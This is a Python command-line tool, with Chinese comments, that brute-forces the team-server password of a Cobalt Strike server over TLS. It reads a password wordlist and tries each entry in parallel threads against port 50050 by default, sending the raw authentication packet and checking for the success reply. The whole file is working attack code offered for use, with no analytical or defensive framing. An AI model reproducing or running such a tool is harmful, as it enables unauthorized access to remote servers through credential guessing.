#!/usr/bin/env python3
import argparse
import concurrent.futures as futures
import socket
import ssl
import sys

# 若运行存在问题，请使用较高版本python
# 简化了 Connector 类，使用了 Python 内置的 with 语句来自动管理连接的打开和关闭。
# 在 passwordcheck 函数中，增加了异常处理来捕捉连接错误和 SSL 错误。
# 使用 with open 语句来自动关闭文件句柄，防止资源泄漏。

parser = argparse.ArgumentParser(description="Guess password for CS.")
parser.add_argument("-o", "--host", dest="host", type=str, help="CS服务端地址",required=True)
parser.add_argument("-p", "--port", dest="port", type=int, help="CS服务端端口",default=50050)
parser.add_argument("-r", "--password", dest="passwordList", type=str, help="密码字典文件路径",required=True)
parser.add_argument("-t", "--threads", dest="threads", type=int, help="线程数，默认30",default=30)
args = parser.parse_args()

host = args.host
port = args.port
passwordList = args.passwordList
threadsNum = args.threads

class NotConnectedException(Exception):
    def __init__(self, message=None, node=None):
        self.message = message
        self.node = node


class DisconnectedException(Exception):
    def __init__(self, message=None, node=None):
        self.message = message
        self.node = node


class Connector:
    def __init__(self):
        self.sock = None
        self.ssl_sock = None
        self.ctx = ssl.SSLContext()
        self.ctx.verify_mode = ssl.CERT_NONE

    def is_connected(self):
        return self.sock and self.ssl_sock

    def connect(self, hostname, port):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(20)    # 一般10
        self.ssl_sock = self.ctx.wrap_socket(self.sock)

        if hostname == socket.gethostname():
            ipaddress = socket.gethostbyname_ex(hostname)[2][0]
            self.ssl_sock.connect((ipaddress, port))
        else:
            self.ssl_sock.connect((hostname, port))

    def close(self):
        if self.sock:
            self.sock.close()
        self.sock = None
        self.ssl_sock = None

    def send(self, buffer):
        self.ssl_sock.sendall(buffer)

    def receive(self):
        received_size = 0
        data_buffer = b""

        while received_size < 4:
            data_in = self.ssl_sock.recv()
            data_buffer = data_buffer + data_in
            received_size += len(data_in)

        return data_buffer

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_value, traceback):
        self.close()

def passwordcheck(password):
    if len(password) == 0:
        return False

    with Connector() as conn:
        conn.connect(args.host, args.port)

        payload = bytearray(b"\x00\x00\xbe\xef") + len(password).to_bytes(1, "big", signed=True) + bytes(
            bytes(password, "ascii").ljust(256, b"A"))
        conn.send(payload)

        result = conn.receive()
    if result == bytearray(b"\x00\x00\xca\xfe"):
        return password
    else:
        return "It's Not "+password

def main():
    passwords = []
    if passwordList:
        with open(passwordList, "r") as f:
            passwords = f.read().split("\n")
    else:
        for line in sys.stdin:
            passwords.append(line.strip())

    if not passwords:
        print("\033[31m[x] Error:password为空，请检查字典路径文件内容 \033[0m")
        return


    with futures.ThreadPoolExecutor(max_workers=threadsNum) as executor:
        future_Password = {executor.submit(passwordcheck, password): password for password in passwords}
        for futureKey in futures.as_completed(future_Password):
            password = future_Password[futureKey]
            try:
                result = futureKey.result()
                if "It's Not " not in result:
                    print(f"\033[32m[o] 爆破成功，目标[{host}:{port}]CS密码: {result}\033[0m")
                    print(f"\033[33m[!] 请按ctrl+c关闭\033[0m") # 该多线程引发的bug，我懒，坐等pull request
                    executor.shutdown(wait=False)
                    sys.exit()
                else:
                    print(f"\033[31m[x] {result}\033[0m", end="\r")
            except Exception as e:
                print(f"\033[31m[x] Error:{password} 测试发生异常: {str(e)}\033[0m", end="\r")


if __name__ == "__main__":
    main()